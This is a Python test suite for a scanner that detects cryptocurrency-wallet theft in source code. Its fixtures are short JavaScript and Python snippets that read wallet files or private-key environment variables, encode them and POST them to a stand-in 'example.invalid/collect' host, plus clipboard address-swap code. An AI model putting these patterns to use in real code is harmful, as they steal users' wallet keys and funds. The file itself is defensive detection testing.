from __future__ import annotations

from app.crypto_guard import scan_crypto_file
from app.models import FileEntry
from app.scanner import scan_sources


def rule_ids(source: str) -> set[str]:
    return {finding.rule_id for finding in scan_crypto_file("src/example.js", source)}


def test_tracks_wallet_data_through_alias_and_encoding_to_network() -> None:
    findings = scan_crypto_file(
        "src/example.js",
        """const fs = require('fs');
const wallet = fs.readFileSync('/home/demo/.electrum/wallets/default_wallet');
const packed = Buffer.from(wallet).toString('base64');
fetch('https://example.invalid/collect', {method: 'POST', body: packed});
""",
    )
    rules = {finding.rule_id for finding in findings}

    assert "CRYPTO-WALLET-001" in rules
    assert "CRYPTO-TX-001" in rules
    assert "CRYPTO-PROX-001" not in rules
    assert next(item for item in findings if item.rule_id == "CRYPTO-TX-001").confidence == "high"


def test_reports_proximity_without_claiming_a_data_flow() -> None:
    rules = rule_ids(
        """const fs = require('fs');
const wallet = fs.readFileSync('/home/demo/.config/solana/id.json');
fetch('https://example.invalid/health', {body: 'status'});
"""
    )

    assert "CRYPTO-PROX-001" in rules
    assert "CRYPTO-TX-001" not in rules


def test_tracks_wallet_environment_value_to_process_arguments() -> None:
    rules = rule_ids(
        """const cp = require('child_process');
const key = process.env.WALLET_PRIVATE_KEY;
const encoded = Buffer.from(key).toString('hex');
cp.execFile('synthetic-tool', ['--key', encoded]);
"""
    )

    assert "CRYPTO-ENV-001" in rules
    assert "CRYPTO-PROC-001" in rules


def test_encoded_private_key_evidence_is_redacted() -> None:
    secret = "a" * 64
    findings = scan_crypto_file("src/example.js", f"const privateKey = '{secret}';\n")
    encoded = next(item for item in findings if item.rule_id == "CRYPTO-SECRET-002")

    assert encoded.evidence.snippet == "[REDACTED: possible private wallet material]"
    assert secret not in encoded.model_dump_json()


def test_identifies_browser_wallet_family() -> None:
    findings = scan_crypto_file(
        "src/example.js",
        "const path = '/Chrome/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';\n",
    )
    wallet = next(item for item in findings if item.rule_id == "CRYPTO-WALLET-001")

    assert "browser wallet extension" in wallet.title
    assert "browser wallet extension" in wallet.evidence.summary


def test_clipboard_rule_requires_address_to_reach_write_call() -> None:
    positive = rule_ids(
        """const replacement = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT';
const current = await navigator.clipboard.readText();
await navigator.clipboard.writeText(replacement);
"""
    )
    negative = rule_ids(
        """// Documentation example: 0x1111111111111111111111111111111111111111
const current = await navigator.clipboard.readText();
await navigator.clipboard.writeText(current.trim());
"""
    )

    assert "CRYPTO-CLIP-001" in positive
    assert "CRYPTO-CLIP-001" not in negative


def test_tracks_python_wallet_environment_value_to_network() -> None:
    rules = rule_ids(
        """import base64
import os
import requests
secret = os.getenv('WALLET_PRIVATE_KEY')
payload = base64.b64encode(secret.encode())
requests.post('https://example.invalid/collect', data=payload)
"""
    )

    assert "CRYPTO-ENV-001" in rules
    assert "CRYPTO-TX-001" in rules


def test_detects_python_clipboard_address_replacement() -> None:
    rules = rule_ids(
        """import pyperclip
replacement = 'bc1qsyntheticaddress000000000000000000000000'
current = pyperclip.paste()
pyperclip.copy(replacement)
"""
    )

    assert "CRYPTO-CLIP-001" in rules


def test_common_source_findings_cannot_leak_encoded_wallet_secret(tmp_path) -> None:
    secret = "a" * 64
    source = f"const privateKey = '{secret}'; fetch('https://example.invalid', {{body: privateKey}});\n"
    path = tmp_path / "example.js"
    path.write_text(source, encoding="utf-8")

    result = scan_sources(
        tmp_path,
        [
            FileEntry(
                path="example.js",
                size=len(source.encode()),
                compressed_size=10,
                sha256="a" * 64,
                kind="javascript",
            )
        ],
    )

    assert result.findings
    assert secret not in "".join(item.model_dump_json() for item in result.findings)
